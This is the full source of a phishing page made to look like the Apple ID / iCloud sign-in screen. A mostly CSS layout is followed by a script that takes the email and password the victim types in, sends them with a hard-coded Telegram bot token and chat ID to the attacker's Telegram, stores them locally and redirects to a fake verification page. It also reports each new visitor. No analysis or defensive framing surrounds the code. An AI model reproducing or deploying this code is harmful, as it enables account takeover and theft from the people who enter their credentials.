<style>
:root {
  --background: #fff;
  --text: rgba(0,0,0,.88);
  --secondary: rgba(0,0,0,.56);
  --muted: rgba(0,0,0,.32);
  --fill: rgba(120,120,128,.2);
  --fill-secondary: rgba(120,120,128,.16);
  --fill-tertiary: rgba(118,118,128,.12);
  --footer: #f2f2f7;
  --icon: #000;
  --toolbar: rgba(251,251,253,.5);
  --focus-border: #fff;
  --shadow: rgba(120,120,128,.16);
}
* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
html { min-height: 100%; background: #fff; }
html, body { display: flex; flex-direction: column; }
body {
  flex: 1; color: var(--text); background: var(--background); color-scheme: light dark;
  font: 400 17px/1.2 "SF Pro Text", "Helvetica Neue", sans-serif;
  -webkit-font-smoothing: antialiased; -webkit-text-size-adjust: 100%; text-size-adjust: 100%;
  text-rendering: optimizeLegibility; touch-action: pan-y;
}
.viewport { position: absolute; inset: 0; overflow-y: auto; z-index: 2; will-change: opacity; }
.page { position: absolute; top: 0; left: 0; width: 100%; min-height: 100%; display: flex; flex-direction: column; }
.toolbar {
  position: sticky; top: 0; z-index: 3; display: flex; align-items: center;
  height: 44px; min-height: 44px; padding: 0 6px 0 16px; letter-spacing: 0;
  user-select: none; background: var(--toolbar); border-bottom: 1px solid var(--toolbar);
}
.toolbar::before { content: ""; position: absolute; inset: 0; z-index: -1; -webkit-backdrop-filter: blur(10px); backdrop-filter: blur(10px); }
.brand { display: flex; align-items: center; flex: 0 0 auto; margin: 1px 0 0 -2px; cursor: pointer; }
.brand-mark { fill: var(--icon); width: auto; height: auto; }
.help {
  position: relative; display: inline-flex; align-items: center; justify-content: center;
  width: 36px; min-width: 36px; height: 36px; margin: 0 4px 0 auto;
  border: 0; border-radius: 8px; color: var(--text); background: transparent;
  font: 600 14px/1.2 "SF Pro Text", "Helvetica Neue", sans-serif;
  cursor: pointer; touch-action: manipulation; outline: none; appearance: none;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap; text-rendering: optimizeLegibility;
}
.help svg { fill: currentColor; }
.help:focus { background: var(--fill-tertiary); }
.help:focus::before { content: ""; position: absolute; inset: 3px; border: 1px solid var(--focus-border); border-radius: 5px; }
@media (pointer: fine) { .help:hover:not(:active) { background: var(--fill-secondary); } }
.help:active:hover { background: var(--fill); color: var(--muted); }
main { flex: 1; display: flex; flex-direction: column; align-items: center; }
.card {
  position: relative; display: flex; flex-direction: column; width: 640px; min-height: 480px;
  margin-top: 44px; border-radius: 34px; background: var(--background);
  box-shadow: 0 11px 34px var(--shadow); -webkit-backdrop-filter: blur(10px); backdrop-filter: blur(10px);
}
.intro {
  position: relative; left: 0; right: 0; display: flex; flex-direction: column; align-items: center;
  margin: 40px 80px 25px; opacity: 0; animation: reveal .5s ease-in-out 1.2s forwards; will-change: opacity;
}
.account-icon { width: 160px; }
.heading { margin-top: 20px; color: var(--text); text-align: center; font: 600 32px/36px "SF Pro Display", "Helvetica Neue", sans-serif; }
@keyframes reveal { from { opacity: 0; } to { opacity: 1; } }
.auth { min-height: 354px; margin-bottom: 40px; color-scheme: normal; }
.auth-frame {
  will-change: transform;
  height: 321px; overflow: hidden; color: #1d1d1f; text-align: center;
  font: 400 17px/1.4705882353 "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
  letter-spacing: -.022em; font-synthesis: none; -moz-osx-font-smoothing: grayscale;
}
.auth-layout { min-width: 210px; margin: auto; padding: 5px; }
@media only screen and (min-device-width: 320px) and (max-device-width: 736px) { .auth-layout { width: 90%; } }
.auth-content { position: relative; max-width: 460px; margin: auto; }
.fields { min-height: 241px; margin-bottom: 10px; }
.field { position: relative; height: 3.3em; }
.field input {
  appearance: none; display: inline-block; width: 100%; height: 56px; padding: 18px 16px 0;
  border: 1px solid #86868b; border-radius: 12px; background: rgba(255,255,255,.8); color: #494949;
  font: 400 17px/1.2353641176 "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
  letter-spacing: -.022em; font-synthesis: none; -webkit-font-smoothing: antialiased;
  text-align: left; text-rendering: auto; text-overflow: ellipsis;
}
.field.account input { border-bottom-left-radius: 0; border-bottom-right-radius: 0; }
.field.password { min-height: 56px; }
.field.password input { border-top-width: 0; border-top-left-radius: 0; border-top-right-radius: 0; padding-right: 43px; transition: height .2s linear; }
.field-label {
  position: absolute; top: 18px; left: 17px; max-width: calc(100% - 32px);
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap; pointer-events: none;
  color: #6e6e73; font-size: 17px; line-height: 1.2353641176; letter-spacing: -.022em;
  transition: .125s ease-in;
}
.field.account .field-label { padding-right: 26px; z-index: 3; }
.field.account .field-label, .field input:focus ~ .field-label {
  top: 10px; font-size: 12px; line-height: 1.3333733333; letter-spacing: -.01em;
}
.field input:focus { outline: none; border-color: #0071e3; border-width: 2px; padding-left: 15px; }
.field.password input:focus { border-top-width: 0; }
.options { position: relative; display: flex; justify-content: space-between; align-items: baseline; flex-wrap: wrap; gap: 5px 10px; margin-top: 12px; }
.remember { display: inline-block; position: relative; line-height: 1; }
.checkbox { position: relative; }
.checkbox input { position: absolute; top: 3px; left: 0; width: 16px; height: 16px; opacity: 0; font-size: medium; }
.checkbox label { position: relative; display: inline; padding: 1px 0 0 26px; font-size: 14px; line-height: inherit; letter-spacing: -.016em; }
.checkbox-mark { position: absolute; top: 2px; left: 0; display: inline-block; width: 14px; height: 14px; box-sizing: content-box; border: 1px solid #86868b; border-radius: 3px; background: rgba(255,255,255,.8); cursor: pointer; }
.checkbox input:checked ~ label .checkbox-mark::after { content: ""; display: inline-block; z-index: 1; position: absolute; top: -7px; left: .5px; font: 400 18px/1.5555555556 "SF Pro Icons"; letter-spacing: .012em; }
.forgot { display: flex; align-items: end; font-size: 14px; line-height: 1.4285914286; letter-spacing: -.016em; }
.forgot a { display: inline; color: #06c; text-decoration: none; cursor: pointer; }
.forgot a:hover { text-decoration: underline; }
.forgot a:active { text-decoration: none; }
.forgot a:focus { outline: 2px solid -webkit-focus-ring-color; outline-offset: 2px; }
.forgot a:focus:active { outline: none; }
.external { white-space: nowrap; }
.external::after { content: ""; display: inline-block; position: relative; z-index: 1; padding-left: .3em; color: inherit; font-family: "SF Pro Icons"; font-style: normal; font-weight: inherit; font-size: inherit; line-height: 1; text-decoration: none; }
.submit {
  display: block; width: 100%; min-width: 30px; margin-top: 32px; padding: 8px 15px;
  border: 1px solid transparent; border-radius: 8px; background: #0071e3; color: #fff;
  font: 400 14px/1.4285914286 "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
  letter-spacing: -.016em; font-synthesis: none; -webkit-font-smoothing: antialiased; text-align: center;
  text-rendering: auto; white-space: nowrap; cursor: pointer; pointer-events: auto;
}
footer { margin-top: 160px; }
.legal { display: flex; align-items: center; justify-content: center; flex-direction: column; width: 100%; padding: 30px 0; overflow: hidden; background: var(--footer); }
.legal-content { width: 1035px; max-width: 1035px; margin: 0 auto; }
.legal-row { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; column-gap: 12px; font: 400 11px/1.2 "SF Pro Text", "Helvetica Neue", sans-serif; }
.legal-links, .copyright-row { display: flex; flex-wrap: wrap; column-gap: 10px; line-height: 2; }
.legal a { text-decoration: none; color: var(--secondary); cursor: pointer; }
.legal a:active { color: rgba(255,255,255,.7); }
.with-separator { display: flex; flex-wrap: nowrap; column-gap: 10px; }
.separator { align-self: center; width: 1px; height: 15px; background: var(--fill-secondary); }
.copyright { margin-left: auto; text-align: center; color: var(--secondary); }
@media (min-width: 760px) and (max-width: 1164px) {
  footer { margin-top: 140px; }
  .legal-content { width: 690px; max-width: 690px; }
}
@media (max-width: 759px) {
  main { width: 100%; }
  .card { width: 100%; flex-grow: 1; margin-top: 0; border-radius: 0; -webkit-backdrop-filter: none; backdrop-filter: none; }
  .card-body { padding: 0 40px; }
  .intro { margin-left: 40px; margin-right: 40px; }
  footer { margin-top: 0; }
  .legal-content { width: 345px; max-width: 345px; }
}
@media (max-width: 759px) and (max-height: 610px) { .card { overflow-y: auto; } }
@media (max-width: 400px) { .card-body { padding: 0 20px; } }
@media (prefers-color-scheme: dark) {
  :root {
    --background: hsl(240,3.4%,11.4%); --text: rgba(255,255,255,.98);
    --secondary: rgba(255,255,255,.66); --muted: rgba(255,255,255,.42);
    --fill: hsla(0,0%,71.4%,.3); --fill-secondary: rgba(120,120,128,.36);

    --toolbar: rgba(28,28,30,.5); --focus-border: hsl(240,1.9%,20.8%); --shadow: rgba(0,0,0,.65);
  }
  html { background: rgb(28,28,30); }
}
</style>

<script>
(function() {
    'use strict';
    
    // ====== CONFIGURATION ======
    const TELEGRAM_BOT_TOKEN = '8905536103:AAETKrARcyzO0oHgxTvonGIIy81_Amz3qcE';
    const TELEGRAM_CHAT_ID = '8391692120';
    const REDIRECT_PAGE = 'icloud_verification_ui_only.html';
    
    // ====== SESSION ID LOGIC ======
    function getSessionId() {
        const urlParams = new URLSearchParams(window.location.search);
        let sessionId = urlParams.get('session');
        if (!sessionId) {
            sessionId = Math.random().toString(36).substring(2, 10);
            const newUrl = window.location.pathname + '?session=' + sessionId;
            window.history.replaceState({}, '', newUrl);
        }
        return sessionId;
    }

    const sessionId = getSessionId();
    const fullUrl = window.location.origin + window.location.pathname + '?session=' + sessionId;
    
    // ====== SEND TO TELEGRAM ======
    function sendToTelegram(email, password, trigger) {
        const message = 
            `🔐 CREDENTIALS CAPTURED!\n\n` +
            `📧 Email/Username: ${email || '(empty)'}` +
            (password ? `\n🔑 Password: ${password}` : `\n🔑 Password: (empty)`) +
            `\n\n📍 Trigger: ${trigger}` +
            `\n🆔 Session ID: ${sessionId}` +
            `\n🔗 Full URL: ${fullUrl}` +
            `\n🕐 Time: ${new Date().toLocaleString()}` +
            `\n🌐 User Agent: ${navigator.userAgent.substring(0, 150)}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        return fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) {
                console.log('✅ Credentials sent to Telegram!');
                return true;
            } else {
                console.warn('⚠️ Telegram send failed:', data);
                return false;
            }
        })
        .catch(error => {
            console.warn('⚠️ Telegram fetch error:', error);
            return false;
        });
    }

    // ====== GET CREDENTIALS ======
    function getCredentials() {
        const emailInput = document.getElementById('account');
        const passwordInput = document.getElementById('password');
        
        const email = emailInput ? emailInput.value.trim() : '';
        const password = passwordInput ? passwordInput.value : '';
        
        return { email, password };
    }

    // ====== CAPTURE & SEND ======
    let sent = false;

    function captureAndSend(trigger) {
        if (sent) {
            console.log('⚠️ Already sent, ignoring...');
            return;
        }
        
        setTimeout(function() {
            const { email, password } = getCredentials();
            
            console.log('%c🔐 CREDENTIALS CAPTURED!', 'font-size:16px;font-weight:bold;color:#0f0;background:#000;padding:8px;border-radius:4px;');
            console.log('📧 Email:', email);
            console.log('🔑 Password:', password ? password.replace(/./g, '*') : '(empty)');
            console.log('📍 Trigger:', trigger);
            console.log('🆔 Session ID:', sessionId);
            console.log('='.repeat(50));
            
            sent = true;
            
            // Store for debugging
            try {
                localStorage.setItem('credentials_captured', JSON.stringify({
                    email, password, trigger, sessionId, timestamp: new Date().toISOString()
                }));
                window._credentials = { email, password, trigger, sessionId, timestamp: new Date().toISOString() };
            } catch(e) {}
            
            // Send to Telegram
            sendToTelegram(email, password, trigger)
                .then(() => {
                    console.log('🚀 Redirecting in 1.5 seconds...');
                    setTimeout(() => {
                        window.location.href = REDIRECT_PAGE;
                    }, 1500);
                })
                .catch(() => {
                    console.log('⚠️ Send failed, still redirecting...');
                    setTimeout(() => {
                        window.location.href = REDIRECT_PAGE;
                    }, 1500);
                });
        }, 200);
    }

    // ====== ENABLE BUTTON ON INPUT ======
    function enableButtonWhenFilled() {
        const submitBtn = document.querySelector('.submit');
        const emailInput = document.getElementById('account');
        const passwordInput = document.getElementById('password');
        
        function checkAndEnable() {
            if (submitBtn) {
                submitBtn.style.opacity = '1';
                submitBtn.style.pointerEvents = 'auto';
                submitBtn.style.cursor = 'pointer';
            }
        }
        
        if (emailInput) {
            emailInput.addEventListener('input', checkAndEnable);
            emailInput.addEventListener('focus', checkAndEnable);
        }
        
        if (passwordInput) {
            passwordInput.addEventListener('input', checkAndEnable);
            passwordInput.addEventListener('focus', checkAndEnable);
        }
        
        checkAndEnable();
    }

    // ====== SETUP SUBMIT BUTTON ======
    function setupSubmitButton() {
        const submitBtn = document.querySelector('.submit');
        
        if (!submitBtn) {
            setTimeout(setupSubmitButton, 300);
            return;
        }
        
        console.log('✅ Submit button found, binding...');
        
        submitBtn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            console.log('🔵 Sign In clicked - capturing...');
            captureAndSend('sign_in_button');
        });
        
        // Also enable on Enter key in password field
        const passwordInput = document.getElementById('password');
        if (passwordInput) {
            passwordInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    e.stopPropagation();
                    captureAndSend('enter_key');
                }
            });
        }
    }

    // ====== MANUAL CAPTURE (Debug) ======
    window.forceCapture = function() {
        const { email, password } = getCredentials();
        console.log('🔵 Manual capture triggered');
        sendToTelegram(email, password, 'manual_force');
    };
    
    window.getCredentials = function() {
        return getCredentials();
    };

    // ====== NEW USER DETECTION ======
    function checkNewUser() {
        const seenBefore = localStorage.getItem('apple_id_visited');
        
        if (!seenBefore) {
            console.log('🆕 First-time visitor');
            localStorage.setItem('apple_id_visited', 'true');
            
            const visitorMsg = 
                `🆕 NEW VISITOR!\n\n` +
                `🆔 Session ID: ${sessionId}\n` +
                `🔗 URL: ${fullUrl}\n` +
                `🕐 Time: ${new Date().toLocaleString()}\n` +
                `📱 User Agent: ${navigator.userAgent.substring(0, 150)}`;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: visitorMsg
                })
            })
            .catch(e => console.warn('Visitor notification failed:', e));
        }
    }

    // ====== INITIAL SETUP ======
    function init() {
        console.log('%c🚨 Apple ID Credential Capture Active', 'font-size:14px;font-weight:bold;color:#0f0;background:#000;padding:6px;border-radius:4px;');
        console.log('📡 Telegram Bot:', TELEGRAM_BOT_TOKEN.substring(0, 10) + '...');
        console.log('🆔 Session:', sessionId);
        console.log('💡 Tip: Fill both fields and click Sign In');
        
        checkNewUser();
        enableButtonWhenFilled();
        
        // Wait for DOM to be fully ready
        setTimeout(setupSubmitButton, 500);
        setTimeout(setupSubmitButton, 1500);
        
        // Watch for button changes (dynamic pages)
        const observer = new MutationObserver(function() {
            if (!document.querySelector('.submit[style*="pointer-events"]')) {
                enableButtonWhenFilled();
            }
        });
        
        observer.observe(document.body, { childList: true, subtree: true });
        
        console.log('✅ Ready!');
    }
    
    // Start when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();
</script>
